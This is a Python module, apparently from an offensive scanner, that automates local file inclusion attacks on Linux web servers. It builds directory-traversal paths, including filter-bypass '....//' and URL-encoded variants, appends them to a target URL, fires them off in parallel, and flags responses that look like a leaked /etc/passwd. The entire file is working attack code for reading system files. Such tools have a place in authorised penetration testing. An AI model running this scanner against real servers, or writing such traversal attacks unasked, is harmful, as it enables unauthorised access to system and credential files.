import urllib.parse
import asyncio
import aiohttp
from banner.banner import END, GREEN_NORMAL

class LinuxLFI:

    @staticmethod
    async def execute_attack_parallel(file_paths, parse):
        file_paths = [line.strip() for line in file_paths]
        threads_count = int('1') if parse.threads == None else int(parse.threads)
        batch = []
        for i in range(len(file_paths)):
            path = None
            if parse.nonrecursive:
                path = LinuxLFI.get_non_recursive_filter_walk_count(file_paths[i], int(parse.walkcount))
            else:
                path = LinuxLFI.get_walk_count(file_paths[i], int(parse.walkcount))
            batch.append(parse.target + path)
            # URL encoded path
            url_encoded_path = parse.target + urllib.parse.quote(path, encoding='utf-8', safe='').replace("..", "%2E%2E")
            batch.append(url_encoded_path)
            
            # When batch reaches the specified number of threads, send requests
            if len(batch) >= threads_count * 2:
                async with aiohttp.ClientSession() as session:
                    batch_results = await LinuxLFI.fetch_batch(batch, session)
                    for j in range(len(batch_results)):
                        # Check for probable LFI indicators
                        if 'root' in batch_results[j] and 'bash' in batch_results[j] and '/bin' in batch_results[j]:
                            print(f"{GREEN_NORMAL}Probable LFI: {batch[j]}{END}")
                
                # Clear batch after sending requests
                batch = []

    @staticmethod
    async def fetch_batch(urls, session):
        tasks = [LinuxLFI.fetch(url, session) for url in urls]
        return await asyncio.gather(*tasks)

    @staticmethod
    async def fetch(url, session):
        async with session.get(url) as response:
            return await response.text()
    
    @staticmethod
    def get_non_recursive_filter_walk_count(path, count):
        for i in range(count):
            if i == 0:
                path = "..../" + path
            else:
                path = "....//" + path
        return path

    @staticmethod
    def get_walk_count(path, count): 
        for i in range(count):
            if i == 0:
                path = ".." + path
            else:
                path = "../" + path
        return path